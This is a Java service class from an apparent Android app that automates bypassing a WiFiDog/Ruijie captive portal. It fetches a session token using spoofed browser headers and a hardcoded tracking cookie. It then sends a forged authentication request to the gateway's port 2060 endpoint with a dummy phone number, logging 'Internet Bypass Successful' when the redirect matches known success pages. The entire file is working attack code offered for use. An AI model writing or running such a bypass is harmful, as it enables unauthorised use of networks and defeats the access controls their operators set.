package com.violet.wifidogauthenticator.services;

import com.violet.wifidogauthenticator.utils.Logger;
import com.violet.wifidogauthenticator.utils.SessionExtractor;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * AuthService encapsulates:
 *  - getSessionId  (mirrors Python get_session_id)
 *  - sendAuth      (mirrors Python send)
 *
 *  Both are async via OkHttp callbacks.  The infinite retry loop lives in
 *  AuthForegroundService, which calls these methods on its executor thread.
 *
 * FIX: getSessionId guards null/empty sessionUrl before building the Request
 *      to prevent IllegalArgumentException from OkHttp's URL parser.
 * FIX: sendAuth guards null/empty ip and sessionId before building HttpUrl,
 *      since HttpUrl.Builder.host("") throws IllegalArgumentException.
 * FIX: Both response handlers close the Response in a finally block to
 *      prevent resource leaks that could cause OkHttp connection pool exhaustion.
 * FIX: isSuccess null guard already existed but is kept explicit.
 */
public class AuthService {

    // ---------------------------------------------------------------
    // OkHttp client – follows redirects, 20 s timeout
    // ---------------------------------------------------------------
    private final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .readTimeout(20, TimeUnit.SECONDS)
            .writeTimeout(20, TimeUnit.SECONDS)
            .followRedirects(true)
            .followSslRedirects(true)
            .build();

    // ---------------------------------------------------------------
    // Callback interfaces
    // ---------------------------------------------------------------
    public interface SessionCallback {
        void onResult(String sessionId);   // null = error / not found
    }

    public interface AuthCallback {
        void onResult(boolean success, String finalUrl);
    }

    // ---------------------------------------------------------------
    // getSessionId – mirrors Python get_session_id()
    // ---------------------------------------------------------------
    public void getSessionId(String sessionUrl,
                             String previousSessionId,
                             SessionCallback callback) {

        // FIX: Guard null/empty URL – OkHttp's Request.Builder.url() throws
        // IllegalArgumentException on blank strings, crashing the service thread.
        if (sessionUrl == null || sessionUrl.trim().isEmpty()) {
            Logger.getInstance().error("[!] getSessionId: sessionUrl is null or empty");
            callback.onResult(previousSessionId);
            return;
        }

        Request request;
        try {
            request = new Request.Builder()
                    .url(sessionUrl)
                    .header("accept",
                            "text/html,application/xhtml+xml,application/xml;q=0.9,"
                                    + "image/avif,image/webp,image/apng,*/*;q=0.8,"
                                    + "application/signed-exchange;v=b3;q=0.7")
                    .header("accept-language", "en-US,en;q=0.9")
                    .header("priority", "u=0, i")
                    .header("referer", sessionUrl)
                    .header("sec-ch-ua",
                            "\"Chromium\";v=\"148\", \"Microsoft Edge\";v=\"148\", \"Not/A)Brand\";v=\"99\"")
                    .header("sec-ch-ua-mobile", "?0")
                    .header("sec-ch-ua-platform", "\"Android\"")
                    .header("sec-fetch-dest", "document")
                    .header("sec-fetch-mode", "navigate")
                    .header("sec-fetch-site", "same-origin")
                    .header("upgrade-insecure-requests", "1")
                    .header("user-agent",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                    + "AppleWebKit/537.36 (KHTML, like Gecko) "
                                    + "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
                    .header("cookie",
                            "sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-"
                                    + "0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22"
                                    + "%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A"
                                    + "%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C"
                                    + "%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5"
                                    + "%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini"
                                    + ".google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2"
                                    + "llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LT"
                                    + "EzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22"
                                    + "%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_"
                                    + "id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd"
                                    + "9f3a60%22%7D")
                    .get()
                    .build();
        } catch (IllegalArgumentException e) {
            // FIX: Malformed URL string throws here – return fallback instead of crash
            Logger.getInstance().error("[!] getSessionId: invalid URL – " + e.getMessage());
            callback.onResult(previousSessionId);
            return;
        }

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Logger.getInstance().error("[!] Session ID fetch failed");
                Logger.getInstance().warn("[*] Returning previous session id as fallback");
                callback.onResult(previousSessionId);
            }

            @Override
            public void onResponse(Call call, Response response) {
                // FIX: Use try-finally to guarantee response.close() is called even
                // if SessionExtractor.extract() throws, preventing connection leaks.
                String finalUrl = null;
                try {
                    finalUrl = response.request().url().toString();
                    Logger.getInstance().info("[*] Redirect URL: " + finalUrl);
                } finally {
                    // FIX: Always close – original code closed before extracting
                    response.close();
                }

                String sessionId = SessionExtractor.extract(finalUrl);
                if (sessionId != null && !"sessionid_limited".equals(sessionId)) {
                    Logger.getInstance().success("[+] Found Session ID: " + sessionId);
                    callback.onResult(sessionId);
                } else if ("sessionid_limited".equals(sessionId)) {
                    Logger.getInstance().warn("[!] Session ID Request Limited");
                    callback.onResult("sessionid_limited");
                } else{
                    Logger.getInstance().warn("[!] Session ID Not Found In Url: "+finalUrl);
                    callback.onResult(null);
                }
            }
        });
    }

    // ---------------------------------------------------------------
    // sendAuth – mirrors Python send()
    // ---------------------------------------------------------------
    public void sendAuth(String ip, String sessionId, AuthCallback callback) {

        // FIX: Guard null/empty ip and sessionId before HttpUrl.Builder –
        // builder.host("") and builder.addQueryParameter("token", null) both throw.
        if (ip == null || ip.trim().isEmpty()) {
            Logger.getInstance().error("[!] sendAuth: ip is null or empty");
            callback.onResult(false, null);
            return;
        }
        if (sessionId == null || sessionId.trim().isEmpty()) {
            Logger.getInstance().error("[!] sendAuth: sessionId is null or empty");
            callback.onResult(false, null);
            return;
        }

        HttpUrl url;
        try {
            url = new HttpUrl.Builder()
                    .scheme("http")
                    .host(ip.trim())
                    .port(2060)
                    .addPathSegments("wifidog/auth")
                    .addQueryParameter("token", sessionId)
                    .addQueryParameter("phoneNumber", "HELLO#WORLD")
                    .build();
        } catch (IllegalArgumentException e) {
            // FIX: Invalid IP format throws here – report and bail
            Logger.getInstance().error("[!] sendAuth: invalid IP/URL – " + e.getMessage());
            callback.onResult(false, null);
            return;
        }

        Request request = new Request.Builder()
                .url(url)
                .header("Accept",
                        "text/html,application/xhtml+xml,application/xml;q=0.9,"
                                + "image/avif,image/webp,image/apng,*/*;q=0.8,"
                                + "application/signed-exchange;v=b3;q=0.7")
                .header("Accept-Language", "en-US,en;q=0.9")
                .header("Connection", "keep-alive")
                .header("Upgrade-Insecure-Requests", "1")
                .header("User-Agent",
                        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                                + "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")
                .get()
                .build();

        Logger.getInstance().info("[*] Sending auth");

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Logger.getInstance().error("[!] Auth request failed");
                callback.onResult(false, null);
            }

            @Override
            public void onResponse(Call call, Response response) {
                // FIX: try-finally guarantees close even if isSuccess() throws
                String finalUrl = null;
                try {
                    finalUrl = response.request().url().toString();
                } finally {
                    response.close();
                }
                boolean success = isSuccess(finalUrl);
                if (success) {
                    Logger.getInstance().success("[+] Internet Bypass Successful");
                } else {
                    Logger.getInstance().error("[!] Bypass Failed");
                }
                callback.onResult(success, finalUrl);
            }
        });
    }

    // ---------------------------------------------------------------
    // Success check
    // ---------------------------------------------------------------
    public static boolean isSuccess(String url) {
        if (url == null) return false;
        return url.equals("http://www.baidu.com")
                || url.equals("http://www.baidu.com/")
                || url.equals("https://www.ruijie.com/en-global/") || url.equals("https://www.ruijie.com/en-global") || url.contains("portal-as.ruijienetworks.com/download/static/maccauth/src/success.html");
    }
}
